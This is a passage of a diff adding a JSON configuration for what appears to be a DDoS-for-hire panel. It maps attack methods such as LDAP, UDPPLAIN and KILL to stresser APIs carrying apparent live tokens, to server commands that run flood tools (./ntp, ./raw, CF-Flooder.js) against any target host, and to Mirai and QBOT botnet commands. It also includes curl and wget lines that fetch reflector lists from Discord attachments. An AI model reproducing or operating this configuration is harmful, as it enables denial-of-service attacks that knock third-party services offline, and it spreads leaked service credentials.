+				"links": [{
+						"link": "https://api.cfxsecurity.ru/?token=nGpUQg0gXBL77eRoDOatoc&host={HOST}&port={PORT}&time={TIME}&method=SADP",
+						"max_time": 3600,
+						"enabled": true
+					}
+
+				]
+			},
+			"servers": {
+				"enabled": false,
+				"all": {
+					"enabled": true,
+					"command": "screen -dmS {HOST} ./ntp {HOST}/32 0 ntpf.txt 1 8000 {TIME}"
+				},
+				"select": {
+					"enabled": false,
+					"servers": [{
+						"tag": "LAYER4#1",
+						"command": "screen -dmS {HOST} ./ntp {HOST}/32 0 ntf.txt 1 25000 {TIME}",
+						"enabled": true
+					}]
+				}
+			},
+			"botnets": {
+				"enabled": false,
+				"all": {
+					"enabled": true,
+					"command": ".attack UDP {HOST} {PORT} {TIME}"
+				},
+				"select": {
+					"enabled": false,
+					"botnets": [{
+							"tag": "QBOT",
+							"command": ".udp {HOST} {TIME} -dport={PORT}",
+							"enabled": true
+						},
+						{
+							"tag": "MIRAI",
+							"command": "UDPFLOOD {HOST} {PORT} {TIME}",
+							"enabled": true
+						}
+					]
+				}
+			},
+			"configuration": {
+				"target_validation": {
+					"ip_address_targets_only": true,
+					"url_and_domain_targets_only": false
+				},
+				"slots": {
+					"max": 5,
+					"enabled": false
+				},
+				"min_time": {
+					"time": 10,
+					"enabled": false
+				},
+				"max_time": {
+					"hard": {
+						"time": 86400,
+						"enabled": false
+					},
+					"soft": {
+						"time": 600,
+						"enabled": false
+					}
+				},
+				"status": {
+					"enabled": true,
+					"vip": false,
+					"private": {
+						"enabled": false,
+						"users": []
+					}
+				}
+			}
+		},
+		{
+			"method": "LDAP",
+			"apis": {
+				"enabled": false,
+				"links": [{
+						"link": "https://api.cfxsecurity.ru/?token=nGpUQg0gXBL77eRoDOatoc&host={HOST}&port={PORT}&time={TIME}&method=LDAP",
+						"max_time": 3600,
+						"enabled": true
+					},
+					{
+						"link": "https://mythicalstressapi.net/?key=1wdugbzbswmwe2197iknfekxt9n65y&host={HOST}&port={PORT}&time={TIME}&method=LDAP",
+						"max_time": 3600,
+						"enabled": true
+					}
+
+				]
+			},
+			"servers": {
+				"enabled": false,
+				"all": {
+					"enabled": true,
+					"command": "screen -dmS {HOST} ./ntp {HOST}/32 0 ntpf.txt 1 8000 {TIME}"
+				},
+				"select": {
+					"enabled": false,
+					"servers": [{
+						"tag": "LAYER4#1",
+						"command": "screen -dmS {HOST} ./ntp {HOST}/32 0 ntf.txt 1 25000 {TIME}",
+						"enabled": true
+					}]
+				}
+			},
+			"botnets": {
+				"enabled": false,
+				"all": {
+					"enabled": true,
+					"command": ".attack UDP {HOST} {PORT} {TIME}"
+				},
+				"select": {
+					"enabled": false,
+					"botnets": [{
+							"tag": "QBOT",
+							"command": ".udp {HOST} {TIME} -dport={PORT}",
+							"enabled": true
+						},
+						{
+							"tag": "MIRAI",
+							"command": "UDPFLOOD {HOST} {PORT} {TIME}",
+							"enabled": true
+						}
+					]
+				}
+			},
+			"configuration": {
+				"target_validation": {
+					"ip_address_targets_only": true,
+					"url_and_domain_targets_only": false
+				},
+				"slots": {
+					"max": 5,
+					"enabled": false
+				},
+				"min_time": {
+					"time": 10,
+					"enabled": false
+				},
+				"max_time": {
+					"hard": {
+						"time": 86400,
+						"enabled": false
+					},
+					"soft": {
+						"time": 600,
+						"enabled": false
+					}
+				},
+				"status": {
+					"enabled": true,
+					"vip": false,
+					"private": {
+						"enabled": false,
+						"users": []
+					}
+				}
+			}
+		},
+		{
+			"method": "UPDATE",
+			"apis": {
+				"enabled": false,
+				"links": [{
+					"link": "https://api.cyberstress.co?token=LBlGhW1SxJmsugbylDq5jd&host={HOST}&port={PORT}&time=time={TIME}&method=DNS",
+					"max_time": 3600,
+					"enabled": true
+				}]
+			},
+			"servers": {
+				"enabled": true,
+				"all": {
+					"enabled": true,
+					"command": "rm -rf ntpf.txt ; curl https://cdn.discordapp.com/attachments/1138870285341294735/1154840966696550491/ntpf.txt -o ntpf.txt ; rm -rf dnsf.txt; curl https://cdn.discordapp.com/attachments/1138870285341294735/1154840872421179553/dnsf.txt -o dnsf.txt"
+				},
+				"select": {
+					"enabled": false,
+					"servers": [{
+						"tag": "LAYER4#1",
+						"command": "screen -dmS {HOST} ./ntp {HOST}/32 0 ntf.txt 1 25000 {TIME}",
+						"enabled": true
+					}]
+				}
+			},
+			"botnets": {
+				"enabled": false,
+				"all": {
+					"enabled": true,
+					"command": ".attack UDP {HOST} {PORT} {TIME}"
+				},
+				"select": {
+					"enabled": false,
+					"botnets": [{
+							"tag": "QBOT",
+							"command": ".udp {HOST} {TIME} -dport={PORT}",
+							"enabled": true
+						},
+						{
+							"tag": "MIRAI",
+							"command": "UDPFLOOD {HOST} {PORT} {TIME}",
+							"enabled": true
+						}
+					]
+				}
+			},
+			"configuration": {
+				"target_validation": {
+					"ip_address_targets_only": true,
+					"url_and_domain_targets_only": false
+				},
+				"slots": {
+					"max": 9999,
+					"enabled": false
+				},
+				"min_time": {
+					"time": 10,
+					"enabled": false
+				},
+				"max_time": {
+					"hard": {
+						"time": 86400,
+						"enabled": false
+					},
+					"soft": {
+						"time": 600,
+						"enabled": false
+					}
+				},
+				"status": {
+					"enabled": true,
+					"vip": false,
+					"private": {
+						"enabled": false,
+						"users": []
+					}
+				}
+			}
+		},
+		{
+			"method": "UDPPLAIN",
+			"apis": {
+				"enabled": false,
+				"links": [{
+					"link": "https://api.cyberstress.co?token=l98VPtercq1S2yEwAAyqck&host={HOST}&port={PORT}&time={TIME}&method=UDPPLAIN",
+					"max_time": 3600,
+					"enabled": false
+				}]
+			},
+			"servers": {
+				"enabled": true,
+				"all": {
+					"enabled": false,
+					"command": "rm -rf ntpf.txt ; wget https://cdn.discordapp.com/attachments/1138870285341294735/1148890996222988339/ntpf.txt"
+				},
+				"select": {
+					"enabled": true,
+					"servers": [{
+							"tag": "RAW#1",
+							"command": "timeout {TIME} ./raw {HOST} 1 8 {TIME}",
+							"enabled": true
+						},
+						{
+							"tag": "RAW#2",
+							"command": "timeout {TIME} ./raw {HOST} 1 8 {TIME}",
+							"enabled": true
+						},
+						{
+							"tag": "RAW#3",
+							"command": "timeout {TIME} ./raw {HOST} 1 4 {TIME}",
+							"enabled": true
+						}
+					]
+				}
+			},
+			"botnets": {
+				"enabled": false,
+				"all": {
+					"enabled": true,
+					"command": ".attack UDP {HOST} {PORT} {TIME}"
+				},
+				"select": {
+					"enabled": false,
+					"botnets": [{
+							"tag": "QBOT",
+							"command": ".udp {HOST} {TIME} -dport={PORT}",
+							"enabled": true
+						},
+						{
+							"tag": "MIRAI",
+							"command": "UDPFLOOD {HOST} {PORT} {TIME}",
+							"enabled": true
+						}
+					]
+				}
+			},
+			"configuration": {
+				"target_validation": {
+					"ip_address_targets_only": true,
+					"url_and_domain_targets_only": false
+				},
+				"slots": {
+					"max": 9999,
+					"enabled": false
+				},
+				"min_time": {
+					"time": 10,
+					"enabled": false
+				},
+				"max_time": {
+					"hard": {
+						"time": 86400,
+						"enabled": false
+					},
+					"soft": {
+						"time": 600,
+						"enabled": false
+					}
+				},
+				"status": {
+					"enabled": true,
+					"vip": false,
+					"private": {
+						"enabled": false,
+						"users": []
+					}
+				}
+			}
+		},
+		{
+			"method": "FREE",
+			"apis": {
+				"enabled": false,
+				"links": [{
+					"link": "https://api.cyberstress.co?token=l98VPtercq1S2yEwAAyqck&host={HOST}&port={PORT}&time={TIME}&method=UDPPLAIN",
+					"max_time": 3600,
+					"enabled": false
+				}]
+			},
+			"servers": {
+				"enabled": true,
+				"all": {
+					"enabled": false,
+					"command": "rm -rf ntpf.txt ; wget https://cdn.discordapp.com/attachments/1138870285341294735/1148890996222988339/ntpf.txt"
+				},
+				"select": {
+					"enabled": true,
+					"servers": [{
+						"tag": "RAW#1",
+						"command": "cd /root/; node CF-Flooder.js GET {HOST} proxy.txt {TIME} 100 8",
+						"enabled": true
+					}]
+				}
+			},
+			"botnets": {
+				"enabled": false,
+				"all": {
+					"enabled": true,
+					"command": ".attack UDP {HOST} {PORT} {TIME}"
+				},
+				"select": {
+					"enabled": false,
+					"botnets": [{
+							"tag": "QBOT",
+							"command": ".udp {HOST} {TIME} -dport={PORT}",
+							"enabled": true
+						},
+						{
+							"tag": "MIRAI",
+							"command": "UDPFLOOD {HOST} {PORT} {TIME}",
+							"enabled": true
+						}
+					]
+				}
+			},
+			"configuration": {
+				"target_validation": {
+					"ip_address_targets_only": true,
+					"url_and_domain_targets_only": false
+				},
+				"slots": {
+					"max": 9999,
+					"enabled": false
+				},
+				"min_time": {
+					"time": 10,
+					"enabled": false
+				},
+				"max_time": {
+					"hard": {
+						"time": 86400,
+						"enabled": false
+					},
+					"soft": {
+						"time": 600,
+						"enabled": false
+					}
+				},
+				"status": {
+					"enabled": true,
+					"vip": false,
+					"private": {
+						"enabled": false,
+						"users": []
+					}
+				}
+			}
+		},
+		{
+			"method": "KILL",
+			"apis": {
+				"enabled": true,
+				"links": [{
+					"link": "http://149.5.172.154/spoofed.php?host={HOST}&port={PORT}&time={TIME}&key=key&method=KILL",
+					"max_time": 3600,
+					"enabled": true
+				}]
+			},
+			"servers": {
+				"enabled": true,
+				"all": {
+					"enabled": true,
+					"command": "pkill screen"
+				},
+				"select": {
+					"enabled": false,
+					"servers": [{
+						"tag": "LAYER4#1",
+						"command": "screen -dmS {HOST} ./ntp {HOST}/32 0 ntf.txt 1 25000 {TIME}",
+						"enabled": true
+					}]
+				}
+			},
+			"botnets": {
+				"enabled": false,
+				"all": {
+					"enabled": true,
+					"command": ".attack UDP {HOST} {PORT} {TIME}"
+				},
+				"select": {
+					"enabled": false,
+					"botnets": [{
+							"tag": "QBOT",
+							"command": ".udp {HOST} {TIME} -dport={PORT}",
+							"enabled": true
+						},
+						{
+							"tag": "MIRAI",
+							"command": "UDPFLOOD {HOST} {PORT} {TIME}",
+							"enabled": true
+						}
+					]
+				}
+			},
+			"configuration": {
+				"target_validation": {
+					"ip_address_targets_only": true,
+					"url_and_domain_targets_only": false
+				},
+				"slots": {
+					"max": 9999,
+					"enabled": false
+				},
+				"min_time": {
+					"time": 10,
+					"enabled": false
+				},
+				"max_time": {
+					"hard": {
+						"time": 86400,
+						"enabled": false
+					},
+					"soft": {
+						"time": 600,
+						"enabled": false
+					}
+				},
+				"status": {
+					"enabled": true,
+					"vip": false,
+					"private": {
+						"enabled": false,
+						"users": []
+					}
+				}
+			}
+		},
+		{
+			"method": "STOP",
+			"apis": {
+				"enabled": false,
+				"links": [{
+					"link": "https://api.cyberstress.co?token=LBlGhW1SxJmsugbylDq5jd&host={HOST}&port={PORT}&time=time={TIME}&method=STOP",
+					"max_time": 1200,
+					"enabled": true
+				}]
+			},
+			"servers": {
+				"enabled": true,
+				"all": {
+					"enabled": true,
+					"command": "pkill -f {HOST}"
+				},
+				"select": {
+					"enabled": false,
+					"servers": [{
+							"tag": "LAYER 4 #1",
+							"command": "screen -dmS {HOST} ./HOME {HOST} {PORT} 10 {TIME}",
+							"enabled": true
+						},
+						{
+							"tag": "LAYER 4 #2",
+							"command": "screen -dmS {HOST} ./HOMEV2 {HOST} {PORT} {THREADS} {TIME}",
+							"enabled": true
+						}
+					]
+				}
+			},
+			"botnets": {
+				"enabled": false,
+				"all": {
+					"enabled": false,
+					"command": ".attack UDP {HOST} {PORT} {TIME}"
+				},
+				"select": {
+					"enabled": false,
+					"botnets": [{
+							"tag": "QBOT",
+							"command": ".udp {HOST} {TIME} -dport={PORT}",
+							"enabled": true
+						},
+						{
+							"tag": "MIRAI",
+							"command": "UDPFLOOD {HOST} {PORT} {TIME}",
+							"enabled": true
+						}
+					]
+				}
+			},
+			"configuration": {
+				"target_validation": {
+					"ip_address_targets_only": true,
+					"url_and_domain_targets_only": false
+				},
+				"slots": {
+					"max": 2,
+					"enabled": false
+				},
+				"min_time": {
+					"time": 10,
+					"enabled": false
+				},
+				"max_time": {
+					"hard": {
+						"time": 86400,
+						"enabled": false
+					},
+					"soft": {
+						"time": 600,
+						"enabled": false
+					}
+				},
+				"status": {
+					"enabled": true,
+					"vip": false,
+					"private": {
+						"enabled": false,
+						"users": []
+					}
+				}
+			}
+		}
+	]
+}
